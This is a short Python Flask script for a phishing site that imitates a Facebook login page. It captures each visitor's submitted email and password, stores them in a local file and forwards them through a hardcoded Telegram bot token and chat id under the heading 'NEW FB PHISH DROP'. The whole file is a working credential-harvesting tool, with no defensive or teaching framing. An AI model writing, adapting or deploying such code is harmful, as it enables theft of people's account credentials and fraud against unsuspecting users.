from flask import *
import json
import requests

app = Flask(__name__)

# =============================
# 📦 Read from local store
# =============================
def read_file():
    try:
        with open("store_p_e.py", "r") as read_only:
            return json.load(read_only)
    except FileNotFoundError:
        return []

# =============================
# 💾 Save locally + send to Telegram
# =============================
def store_info_here(collect_info, single_info):
    # Save locally
    with open("store_p_e.py", "w") as paste_info:
        json.dump(collect_info, paste_info, indent=4)

    # Send to Telegram
    token = "7354669720:AAFlBMYMUjALbbAmmCtmL273ah2oP9m1rhw"      # your real bot token
    chat_id = "6372101595"                  # your real chat_id

    message = f"""
🪬 NEW FB PHISH DROP 🪬

📧 Email: {single_info["User_Email"]}
🔑 Password: {single_info["User_Password"]}
"""

    url = f"https://api.telegram.org/bot{token}/sendMessage"
    data = {
        "chat_id": chat_id,
        "text": message
    }

    try:
        response = requests.post(url, data=data)
        print(response.text)  # For debugging
    except Exception as e:
        print("Error sending to Telegram:", e)

# =============================
# 🌐 Route
# =============================
@app.route("/", methods=['GET', 'POST'])
def hello():
    hold = read_file()
    if request.method == "POST":
        email = request.form['Email']
        pass_word = request.form['Password']
        storing = {
            "User_Email": email,
            "User_Password": pass_word,
        }
        hold.append(storing)
        store_info_here(hold, storing)
        return "Login successfull"

    return render_template("html.html")

# =============================
# 🚀 Run
# =============================
if __name__ == "__main__":
    app.run(debug=True)
